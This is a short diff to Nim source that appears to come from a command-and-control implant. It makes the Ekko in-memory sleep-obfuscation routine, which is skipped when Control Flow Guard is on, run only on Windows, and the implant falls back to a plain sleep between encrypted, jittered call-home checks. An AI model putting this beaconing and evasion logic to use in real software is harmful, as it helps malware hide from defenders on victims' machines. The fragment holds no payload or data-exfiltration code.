@@ -39,9 +39,12 @@ proc nimbo_main*(): void =
         server_content = parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))
         if len(server_content) == 0:
             sleep_time = calc_sleep_time(call_home_timeframe, call_home_jitter_percent)      
-            if memsleep_technique == 1 and not isControlFlowGuardEnabled():
-                nEkko(sleep_time)  
-            elif memsleep_technique == 0:
+            when defined(windows):
+                if memsleep_technique == 1 and not isControlFlowGuardEnabled():
+                    nEkko(sleep_time)
+                elif memsleep_technique == 0:
+                    sleep(sleep_time)
+            else:
                 sleep(sleep_time)
             continue
         else:
